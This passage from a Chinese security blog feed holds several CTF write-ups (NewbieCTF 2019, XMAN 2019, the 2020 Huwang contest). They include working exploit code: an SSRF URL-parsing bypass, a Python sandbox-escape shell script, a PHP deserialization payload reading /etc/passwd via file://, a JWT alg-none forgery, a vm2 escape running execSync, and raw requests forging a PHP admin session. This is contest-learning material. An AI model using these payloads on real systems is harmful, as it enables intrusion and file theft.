alt="image-20191103111420354"></p><p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p><p>观察secret发现，每次访问给出的secret都不一样</p><p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p><p>这就很容易想到php里面libcurl和parase的差异</p><blockquote><p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a href="http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com" target="_blank" rel="noopener">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p><p>from  <a href="https://paper.seebug.org/561" target="_blank" rel="noopener">https://paper.seebug.org/561</a> </p></blockquote><p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p><p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p><p>KorNewbie{w0w_e4g1e_3y3}</p><h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p><p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p><p>观察发现一个字符会被编码成2位的16进制的数据</p><p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p><p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p><pre><code class="python">s2=&#39;45 dd 97 38 62 6c 62 85&#39;.split(&#39; &#39;)s1=&#39;3a 93 78 3a 6c 63 3a 63&#39;.split(&#39; &#39;)print(s1)print(s2)for i in range(len(s1)):    print(chr(ord(&#39;0&#39;)+int(s1[i],16)-int(s2[i],16)),end=&#39;&#39;)</code></pre><p>KorNewbie{Nace_I_believed_it}</p><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p><blockquote><p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p><p>Analyze the packet and flag the password and information obtained for the ftp connection!</p><p>flag format : KorNewbie{password_yougetinformation}</p><p>※ If there is a hash value, it will be md5.</p></blockquote><p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p><p>过滤找到ftp传输文件和账号密码</p><p>password:root</p><p>badguy.txt</p><pre><code>7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</code></pre><p>decode得到</p><pre><code>이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. //alpha组的个人信息全部放在下面的地址里。祝你成功..https://pastebin.com/70yDGiRS</code></pre><p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p><p>题目提示得到的一个信息是md5</p><p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p><p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p><p>这里也提示了凯撒加密</p><p>但是用国内的md5解密网站无论如何也破不了</p><p>用朝鲜语搜了一下就解密了</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p><p>KorNewbie{root_IronDragon}</p><p>………………………</p><p>这是个梗吗.</p><h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p><blockquote><p>Confidential information came and went through chat. Find the email of the user who used the chat. </p></blockquote><p>user:NewbieCTF2019</p><p>在youtube找到一个好玩的重置密码的方法</p><p> <a href="https://www.youtube.com/watch?v=YBFAzK9mgNI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p><p>根据这个来重置密码</p><p>重置密码后看着棒子文我是懵逼的(同伴+1)</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p><p>根据题目提示聊天软件理所当然的盯上了kakao</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p><p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p><p>最后拿到flag</p><p><code>KorNewbie{renek@it-simple.net}</code></p><h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p><p>于是就开始用binwalk,strings…..</p><p>最后翻一翻找到了seg段…………</p><p>在seg段找到</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/nbctf/">https://www.ccreater.top/2020/04/20/nbctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019xman个人排位赛wp</title>
      <link href="2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/"/>
      <url>2020/04/20/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p><p>getattr:对沙箱逃逸有很大作用</p><p>list(s)获得字符集,可以用来绕过引号限制</p><p>试了一下system</p><pre><code class="python">banned=  [&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;.&#39;, &#39;reload&#39;, &#39;open&#39;, &#39;input&#39;, &#39;file&#39;, &#39;if&#39;, &#39;else&#39;, &#39;eval&#39;, &#39;exit&#39;, &#39;import&#39;, &#39;quit&#39;, &#39;exec&#39;, &#39;code&#39;, &#39;const&#39;, &#39;vars&#39;, &#39;str&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;local&#39;, &#39;global&#39;, &#39;join&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;translate&#39;, &#39;try&#39;, &#39;except&#39;, &#39;with&#39;, &#39;content&#39;, &#39;frame&#39;, &#39;back&#39;]</code></pre><p>发现引号和点都被过滤了,不过提示说</p><pre><code class="python">def hello():   os.system(&quot;echo hello&quot;)</code></pre><p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p><p>而引号被过滤可以用字符串s里的值来绕过</p><pre><code class="python">#考虑这样来a=getattr(os,&#39;system&#39;)a(&quot;命令&quot;)</code></pre><pre><code class="python">def get_str(string):    result=&#39;&#39;    for i in string:        result+=&#39;table[&#39;+str(table.index(i))+&#39;]+&#39;    return result[:-1]conn=remote(&#39;47.97.253.115&#39;,10005)conn.sendline(&#39;table=list(s)&#39;)conn.sendline(&#39;sys=&#39;+get_str(&#39;system&#39;))conn.sendline(&#39;fun=getattr(os,sys)&#39;)while 1:        command=input(&#39;(www):$&#39;)        new_com=&#39;fun(&#39;+get_str(command)+&#39;)&#39;        conn.sendline(new_com)        print(conn.recvuntil(&#39;&gt;&gt;&gt;&#39;))conn.close()</code></pre><p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p><h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p><p>所有的数据都是32个字符</p><p>所以猜测是md5加密</p><p>找出符合md5格式的数据</p><p>68dffd5a1be838b5326209714f7ea7a5</p><p>解密后提交flag{n3k0}失败</p><p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p><p>成功</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p><pre><code class="php">&lt;?phpclass Hello {    protected $a;    function test() {        $b = strpos($this-&gt;a, &#39;flag&#39;);        if($b) {            die(&quot;Bye!&quot;);        }        $c = curl_init();        curl_setopt($c, CURLOPT_URL, $this-&gt;a);        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);        echo curl_exec($c);    }    function __destruct(){        $this-&gt;test();    }}if (isset($_GET[&quot;z&quot;])) {    unserialize($_GET[&quot;z&quot;]);} else {    highlight_file(__FILE__);}</code></pre><p>curl_exec+反序列化</p><p>试了下本地文件读取</p><p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p><p>题目过滤flag字符</p><p>说明我们flag就在flag文件里</p><p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p><p>最后的payload:</p><p><a href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}" target="_blank" rel="noopener">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p><p>这里有一些坑就是:</p><ol><li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p></li><li><p>因为是二次编码所以要注意字符串的长度</p></li></ol><h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p><p>发现onion.jpg文件尾后还有数据</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p><p>zip格式,get一个新的加密压缩包</p><p>密码在hint里有提示</p><p>接下来就是很普通的写python了</p><pre><code class="python">import zipfiledef burp(filename,hint):    password=&#39;&#39;    i=0    for i in range(32,128):        password=hint.replace(&#39;?&#39;,chr(i))        with zipfile.ZipFile(filename) as myzip:            try :                print(&quot;解密:&quot;+filename+&quot;:&quot;+password)                myzip.read(&#39;onion.zip&#39;,pwd=bytes(password,encoding=&#39;ascii&#39;))                break                return password            except RuntimeError:                 print(&quot;解密失败&quot;)            except FileNotFoundError:                input(&#39;过来康康&#39;)            except zipfile.zlib.error:                print(&quot;跳过&quot;)    if i==127:        print(&quot;爆破失败&quot;)        exit()    print(&#39;爆破成功&#39;+password)    return passworddef writebyte(bbyte,filename):    f=open(filename,&#39;wb&#39;)    f.write(bbyte)    f.close()def readbyte(filename):    f=open(filename,&#39;rb&#39;)    bbyte=f.read()    f.close()    return bbytenullbyte=b&#39;&#39;while 1:    f=open(&#39;temp.txt&#39;,&#39;r&#39;)    hint=f.read()[12:]    f.close()    pwd=burp(&#39;onion1.zip&#39;,hint)    with zipfile.ZipFile(&#39;onion1.zip&#39;) as myzip:        str=myzip.read(&#39;onion.zip&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))        writebyte(str,&quot;temp.zip&quot;)        str=myzip.read(&#39;hint.txt&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))        writebyte(str,&quot;temp.txt&quot;)    writebyte(readbyte(&#39;temp.zip&#39;),&#39;onion1.zip&#39;)</code></pre><h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p><pre><code class="python">def encrypt(data,groupnums):    a=[]    b=[]    section=int(len(data)/groupnums)    for i in range(0,len(data),section):        a.append(data[i:i+section])    for i in range(section):        for j in range(groupnums):            b.append(a[j][i])    cipher=(&#39;&#39;.join(chr(ord(b[i])^i) for i in range(len(b))))    return cipherdef decrypt(data):    result=[]    for i in range(1,len(data)+1):        result.append(encrypt(data,i))    return resultmay_r=decrypt(&#39;f^n2ekass:iy~&gt;w|`ef&quot;${Ip)8if&#39;)for i in may_r:    print(i[::2]+i[1::2])</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/2019xman个人排位赛wp/">https://www.ccreater.top/2020/04/20/2019xman个人排位赛wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020数字中国创新大赛-虎符网络安全</title>
      <link href="2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
      <url>2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>在static/js/app.js中发现</p><pre><code class="javascript">/** *  或许该用 koa-static 来处理静态文件 *  路径该怎么配置？不管了先填个根目录XD */</code></pre><p>于是直接访问app.js</p><pre><code class="javascript">const Koa = require(&#39;koa&#39;);const bodyParser = require(&#39;koa-bodyparser&#39;);const session = require(&#39;koa-session&#39;);const static = require(&#39;koa-static&#39;);const views = require(&#39;koa-views&#39;);const crypto = require(&#39;crypto&#39;);const { resolve } = require(&#39;path&#39;);const rest = require(&#39;./rest&#39;);const controller = require(&#39;./controller&#39;);const PORT = 80;const app = new Koa();app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];global.secrets = [];app.use(static(resolve(__dirname, &#39;.&#39;)));app.use(views(resolve(__dirname, &#39;./views&#39;), {  extension: &#39;pug&#39;}));app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));// parse request body:app.use(bodyParser());// prepare restful serviceapp.use(rest.restify());// add controllers:app.use(controller());app.listen(PORT);console.log(`app started at port ${PORT}...`);</code></pre><p>然后rest.js</p><pre><code class="javascript">module.exports = {    APIError: function (code, message) {        this.code = code || &#39;internal:unknown_error&#39;;        this.message = message || &#39;&#39;;    },    restify: () =&gt; {        const pathPrefix = &#39;/api/&#39;;        return async (ctx, next) =&gt; {            if (ctx.request.path.startsWith(pathPrefix)) {                ctx.rest = data =&gt; {                    ctx.response.type = &#39;application/json&#39;;                    ctx.response.body = data;                };                try {                    await next();                } catch (e) {                    ctx.response.status = 400;                    ctx.response.type = &#39;application/json&#39;;                    ctx.response.body = {                        code: e.code || &#39;internal_error&#39;,                        message: e.message || &#39;&#39;                    };                }            } else {                await next();            }        };    }};</code></pre><p>controller.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;);function addMapping(router, mapping) {    for (const url in mapping) {        if (url.startsWith(&#39;GET &#39;)) {            const path = url.substring(4);            router.get(path, mapping[url]);        } else if (url.startsWith(&#39;POST &#39;)) {            const path = url.substring(5);            router.post(path, mapping[url]);        } else {            console.log(`invalid URL: ${url}`);        }    }}function addControllers(router, dir) {    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {        return f.endsWith(&#39;.js&#39;);    }).forEach(f =&gt; {        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);        addMapping(router, mapping);    });}module.exports = (dir) =&gt; {    const controllers_dir = dir || &#39;controllers&#39;;    const router = require(&#39;koa-router&#39;)();    addControllers(router, controllers_dir);    return router.routes();};</code></pre><p>fuzz controllers目录得到</p><p>api.js</p><pre><code class="javascript">const crypto = require(&#39;crypto&#39;);const fs = require(&#39;fs&#39;)const jwt = require(&#39;jsonwebtoken&#39;)const APIError = require(&#39;../rest&#39;).APIError;module.exports = {    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || username === &#39;admin&#39;){            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);        }        if(global.secrets.length &gt; 100000) {            global.secrets = [];        }        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);        const secretid = global.secrets.length;        global.secrets.push(secret)        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});        ctx.rest({            token: token        });        await next();    },    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {        const {username, password} = ctx.request.body;        if(!username || !password) {            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);        }        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;        console.log(sid)        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        }        const secret = global.secrets[sid];        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});        const status = username === user.username &amp;&amp; password === user.password;        if(status) {            ctx.session.username = username;        }        ctx.rest({            status        });        await next();    },    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {        if(ctx.session.username !== &#39;admin&#39;){            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);        }        const flag = fs.readFileSync(&#39;/flag&#39;).toString();        ctx.rest({            flag        });        await next();    },    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {        ctx.session.username = null;        ctx.rest({            status: true        })        await next();    }};</code></pre><p>view.js</p><pre><code class="javascript">module.exports = {    &#39;GET /&#39;: async (ctx, next) =&gt; {        ctx.status = 302;            ctx.redirect(&#39;/home&#39;);    },    &#39;GET /login&#39;: async (ctx, next) =&gt; {        if(ctx.session.username) {            ctx.status = 302;                await ctx.redirect(&#39;/home&#39;);        } else {            await ctx.render(&#39;login&#39;);            await next();        }    },    &#39;GET /register&#39;: async (ctx, next) =&gt; {        if(ctx.session.username) {            ctx.status = 302;                await ctx.redirect(&#39;/home&#39;);        } else {            await ctx.render(&#39;register&#39;);            await next();        }    },    &#39;GET /home&#39;: async (ctx, next) =&gt; {        if(!ctx.session.username) {            ctx.status = 302;                await ctx.redirect(&#39;/login&#39;);        } else {            await ctx.render(&#39;home&#39;, {                username: ctx.session.username,            });            await next();        }    }};</code></pre><p>阅读代码发现：</p><pre><code class="javascript">const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        }const secret = global.secrets[sid];//验证之前</code></pre><p>我们可以控制sid来选择任意的密钥</p><p> node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 </p><p>我们令<code>sid=false</code>,则可以通过</p><pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);        }</code></pre><p>的验证，且<code>global.secrets[sid]=undefined</code></p><p>最后的payload</p><pre><code class="python">import jwtimport jsona=json.loads(&#39;&#39;&#39;{        &quot;secretid&quot;: false,        &quot;username&quot;:&quot;admin&quot;,        &quot;password&quot;: &quot;admin&quot;,        &quot;iat&quot;: 1587310401}&#39;&#39;&#39;)print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre><h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>数学运算code: (2+6-7)/3run online: /run.php?code=(2%2b6-7)/3;Ouput: 0.3333333333333333注意编码 =.=时间戳code: new Date();run online: /run.php?code=new%20Date();Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)真的是 PHP 嘛</code></pre><p>刚开始还真的以为是php,再输入console的时候返回 <code>[object Object]</code>，这题应该是nodejs</p><p>在网上找到<a href="https://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS" target="_blank" rel="noopener">类似的题目</a></p><p>在vm2的issue中找到 <a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p><p>payload:</p><pre><code class="javascript">const axios = require(&#39;axios&#39;)const untrusted = &#39;(&#39; + function(){    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try{        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    }catch(e){        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();    }}+&#39;)()&#39;;const content = Buffer.from(untrusted).toString(&#39;hex&#39;)axios.get(&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;).then(p =&gt; {    console.log(p.data)}).catch(p =&gt; {    console.log((p.response.data))})</code></pre><h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;highlight_file(__FILE__);if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;){    $filename=&#39;/var/babyctf/success.txt&#39;;    if(file_exists($filename)){            safe_delete($filename);            die($flag);    }}else{    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;}$direction = filter_input(INPUT_POST, &#39;direction&#39;);$attr = filter_input(INPUT_POST, &#39;attr&#39;);$dir_path = &quot;/var/babyctf/&quot;.$attr;if($attr===&quot;private&quot;){    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];}if($direction === &quot;upload&quot;){    try{        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){            throw new RuntimeException(&#39;invalid upload&#39;);        }        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){            throw new RuntimeException(&#39;invalid file path&#39;);        }        @mkdir($dir_path, 0700, TRUE);        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){            $upload_result = &quot;uploaded&quot;;        }else{            throw new RuntimeException(&#39;error while saving&#39;);        }    } catch (RuntimeException $e) {        $upload_result = $e-&gt;getMessage();    }} elseif ($direction === &quot;download&quot;) {    try{        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));        $file_path = $dir_path.&quot;/&quot;.$filename;        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){            throw new RuntimeException(&#39;invalid file path&#39;);        }        if(!file_exists($file_path)) {            throw new RuntimeException(&#39;file not exist&#39;);        }        header(&#39;Content-Type: application/force-download&#39;);        header(&#39;Content-Length: &#39;.filesize($file_path));        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);        if(readfile($file_path)){            $download_result = &quot;downloaded&quot;;        }else{            throw new RuntimeException(&#39;error while saving&#39;);        }    } catch (RuntimeException $e) {        $download_result = $e-&gt;getMessage();    }    exit;}?&gt;</code></pre><p>因为上传目录和sess文件所在目录相同，可以伪造sess</p><pre><code>POST / HTTP/1.1Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.comContent-Length: 395Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtmUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;Connection: close------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;direction&quot;upload------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;attr&quot;------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;Content-Type: text/plain\x08usernames:5:&quot;admin&quot;;------WebKitFormBoundaryx5uJpSmC7ijBPrtm--</code></pre><p>成功伪造admin身份</p><p>接下来就是要弄个success.txt了，虽然我们文件名会被加个后缀</p><p>但是我们可以通过创建<code>success.txt</code>文件夹来达到相同效果</p><pre><code class="php">POST / HTTP/1.1Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.comContent-Length: 406Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtmUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffdConnection: close------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;direction&quot;upload------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;attr&quot;success.txt------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;Content-Type: text/plainusernames:5:&quot;admin&quot;;------WebKitFormBoundaryx5uJpSmC7ijBPrtm--</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/">https://www.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin_登陆后_rce</title>
      <link href="2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/"/>
      <url>2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/</url>
      
